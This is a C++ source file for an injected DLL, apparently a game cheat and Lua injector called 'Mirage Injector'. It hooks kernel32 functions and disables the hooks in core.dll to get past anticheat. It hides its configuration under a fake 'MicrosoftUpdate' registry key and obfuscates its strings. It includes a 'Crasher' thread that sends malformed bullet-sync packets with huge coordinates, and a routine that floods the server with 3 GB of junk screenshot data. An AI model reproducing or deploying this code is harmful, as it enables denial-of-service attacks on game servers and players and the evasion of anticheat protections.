#include "Utils.h"
#include "XorCryptor.h"
#include "CShooting.h"
#include "LuaInjector.h"
#include "AnticheatBypass.h"
#include "Signatures.h"
#include "ScriptConfig.h"

extern "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(NULL, code, wParam, lParam);
}
// Создаём каталог ровно один раз
static void EnsureDumpDirectory()
{
    static std::once_flag flag;
    std::call_once(flag, []()
    {
        kDumpDir = CvWideToAnsi(mapped_image_dir) + xorstr_("\\DumpedHeap");
        std::filesystem::create_directories(kDumpDir);
    });
}
void Crasher()
{
    while (true)
    {
        if (CNetAPI != nullptr && crasher)
        {
            static int m_ucBulletSyncOrderCounter = 1;
            constexpr float fInvalidVectorValue = 1000000000.0f;
            CVector fake_vecStart(fInvalidVectorValue, fInvalidVectorValue, fInvalidVectorValue);
            CVector fake_vecEnd(-fInvalidVectorValue, -fInvalidVectorValue, -fInvalidVectorValue);
            //CVector fake_vecStart(1.0f, 1.0f, 1.0f);
            //CVector fake_vecEnd(2999.0f, 2999.0f, 2999.0f);
            NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();

            // Write the bulletsync data
            pBitStream->Write((char)WEAPONTYPE_M4);

            pBitStream->Write((const char*)&fake_vecStart, sizeof(CVector));
            pBitStream->Write((const char*)&fake_vecEnd, sizeof(CVector));

            pBitStream->Write(m_ucBulletSyncOrderCounter++);

            pBitStream->WriteBit(false);

            // Send the packet
            g_pNet->SendPacket(PACKET_ID_PLAYER_BULLETSYNC, pBitStream, PACKET_PRIORITY_MEDIUM, PACKET_RELIABILITY_RELIABLE);
            g_pNet->DeallocateNetBitStream(pBitStream);
        }
        Sleep(250);
    }
}
typedef void(__stdcall* ptrExitProcess)(UINT uExitCode);
ptrExitProcess callExitProcess = nullptr;
void __stdcall hkExitProcess(UINT uExitCode) {}
static std::string RandomString(std::size_t len)
{
	static const char charset[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789";
	static thread_local std::mt19937 gen{ std::random_device{}() };
	std::uniform_int_distribution<>  dist(0, sizeof(charset) - 2);

	std::string out;
	out.reserve(len);
	while (len--)
		out.push_back(charset[dist(gen)]);
	return out;
}
void SendRagCarpetScreenShot()
{
    /* 1. Константы ------------------------------------------------------- */
    constexpr uint32_t kUiBytesPerPart = 65535U;                                 // Максимум для uint16_t
    constexpr uint32_t kRealBufferSize = kUiBytesPerPart;
    constexpr uint32_t kUiTotalByteSize = 3U * 1024U * 1024U * 1024U;           // 3 ГБ
    constexpr uint32_t kUiNumParts = (kUiTotalByteSize + kUiBytesPerPart - 1) / kUiBytesPerPart; // ~49153 частей
    constexpr uint32_t kIntervalMs = 50;                                         // мс

    /* 2. Реальные 65535 байт шума + случайные метаданные -------------------- */
    std::vector<char> vData(kRealBufferSize);
    {
        std::mt19937                    g{ std::random_device{}() };
        std::uniform_int_distribution<> d(0, 255);
        for (char& c : vData)
            c = static_cast<char>(d(g));
    }

    std::mt19937                            g{ std::random_device{}() };
    std::uniform_int_distribution<uint16_t> d16(1, 65'535);
    uint16_t                                usResNetId = d16(g);
    std::string                             strResName = RandomString(12);
    std::string                             strTag = RandomString(8);
    std::uniform_int_distribution<uint32_t> d32(1, 0xFFFFFFFF);
    uint32_t                                uiServerTime = d32(g);

    static std::atomic<uint16_t> s_id{ 0 };
    uint16_t                     usShotId = ++s_id;

    std::thread(
        [=, data = std::move(vData)]() mutable
        {
            static char junk[65535] = { 0 };

            for (uint32_t part = 0; part < kUiNumParts; ++part)
            {
                NetBitStreamInterface* bs = g_pNet->AllocateNetBitStream();

                bs->Write(static_cast<uchar>(1));
                bs->Write(usShotId);
                bs->Write(static_cast<uint16_t>(part));

                uint32_t    offset = part * kUiBytesPerPart;
                const char* pSend = junk;
                uint16_t    sz = kUiBytesPerPart;

                if (offset < kRealBufferSize)
                {
                    sz = static_cast<uint16_t>(std::min<uint32_t>(kRealBufferSize - offset, kUiBytesPerPart));
                    pSend = data.data() + offset;
                }

                bs->Write(sz);
                bs->Write(pSend, sz);

                if (part == 0)
                {
                    bs->Write(uiServerTime);
                    bs->Write(kUiTotalByteSize);
                    bs->Write(static_cast<uint16_t>(kUiNumParts));
                    bs->Write(usResNetId);
                    bs->WriteString(strTag.c_str());
                    bs->WriteString(strResName.c_str());
                }

                g_pNet->SendPacket(PACKET_ID_PLAYER_SCREENSHOT, bs, PACKET_PRIORITY_LOW,
                    PACKET_RELIABILITY_RELIABLE_ORDERED, PACKET_ORDERING_DATA_TRANSFER);
                g_pNet->DeallocateNetBitStream(bs);

                std::this_thread::sleep_for(std::chrono::milliseconds(kIntervalMs));
            }
        })
        .detach();
}
void AsyncThread()
{
    // Хуй найдут пидоры
    CEasyRegistry* reg = new CEasyRegistry(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\MicrosoftUpdate_8246G", false);
    if (reg != nullptr)
    {
		lua_scripts_dir = reg->ReadString(xorstr_(L"MicrosoftDir")); // папка с нашими луа скриптами и конфигами
        mapped_image_dir = reg->ReadString(xorstr_(L"WindowsDir")); // папка где лежит длл инжектор и его дллка
        mirage_config_dir = reg->ReadString(xorstr_(L"UpdateDir")); // путь с конфигом луа инжектора
        EnsureDumpDirectory();
        delete reg;
    }
    MH_Initialize();
	callExitProcess = (ptrExitProcess)GetProcAddress(GetModuleHandleA(xorstr_("kernel32.dll")), xorstr_("ExitProcess"));
	if (callExitProcess != nullptr)
	{
		MakeJump((DWORD)callExitProcess, (DWORD)hkExitProcess, exit_prologue, sizeof(exit_prologue));
		LogInFile(LOG_NAME, xorstr_("[LOG] ExitProcess is Hooked!\n"));
	}
	else LogInFile(LOG_NAME, xorstr_("[LOG] ExitProcess export is NULL!\n"));
    RemoveOldLog();
	RemoveOldDumpedScripts(xorstr_("DumpedScripts"));
    RemoveOldDumpedScripts(xorstr_("Chunks"));
    LogInFile(LOG_NAME, xorstr_("[LOG] Mirage Injector By DroidZero! Build Version: %s\n"), MIRAGE_VERSION);
    ParseLuaConfig(); // Читаем луашные конфиги, 1 конфиг на 1 луа скрипт
    ParseMirageConfig(); // Грузим настройки луа инжектора
    if (GetModuleHandleA(xorstr_("core.dll")))
    {
        LogInFile(LOG_NAME, xorstr_("[LOG] core.dll hooks completely destroyed!\n"));
        RemoveProcedureHook();
        CorePatcher();
	}
	else LogInFile(LOG_NAME, xorstr_("[LOG] core.dll module is not loaded!\n"));    
    callGetThreadContext = (ptrGetThreadContext)GetProcAddress(GetModuleHandleA(xorstr_("kernel32.dll")), xorstr_("GetThreadContext"));
    if (callGetThreadContext != nullptr)
    {
        if ((!DbgHook || mirage.hwbp_hooking == HookingType::HWBP_HOOK) && mirage.hwbp_hooking != HookingType::IAT)
        {
            LogInFile(LOG_NAME, xorstr_("[LOG] GetThreadContext is Hooked!\n"));
            MakeJump((DWORD)callGetThreadContext, (DWORD)hookGetThreadContext, thread_prologue, sizeof(thread_prologue));
        }
    }
	HMODULE hKernel32 = GetModuleHandleA(xorstr_("kernel32.dll"));
	if (hKernel32)
	{
		callLoadLibraryExW = (ptrLoadLibraryExW)GetProcAddress(hKernel32, xorstr_("LoadLibraryExW"));
		if (callLoadLibraryExW != nullptr)
		{
            // ставим инлайн хук на загрузку дллок в процесс
			MakeJump((DWORD)callLoadLibraryExW, (DWORD)hkLoadLibraryExW, loadlib_prologue, sizeof(loadlib_prologue));
			LogInFile(LOG_NAME, xorstr_("[LOG] LoadLibraryExW is Hooked!\n"));
		}
		else LogInFile(LOG_NAME, xorstr_("[LOG] LoadLibraryExW export is NULL!\n"));
	}
    else LogInFile(LOG_NAME, xorstr_("[LOG] GetModuleHandleA to kernel32.dll module is NULL!\n"));
	std::thread crasher_thread(Crasher);
	crasher_thread.detach();
    while (true)
    {
        if (GetModuleHandleA(xorstr_("client.dll")) && GetAsyncKeyState(VK_F2))
        {
			//SendRagCarpetScreenShot();
            crasher ^= true;
            std::wstring sound_path = mapped_image_dir + xorstr_(L"\\roar.wav");
            PlaySoundW(sound_path.c_str(), NULL, SND_FILENAME | SND_ASYNC);
            Sleep(1000);
        }
        Sleep(150);
    }
}

__forceinline void AsyncBitch()
{
    // отделяемся в другой ассинхронный поток от основного с игры
    std::thread t(AsyncThread);
    t.detach();
}

int __stdcall DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        AsyncBitch();
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

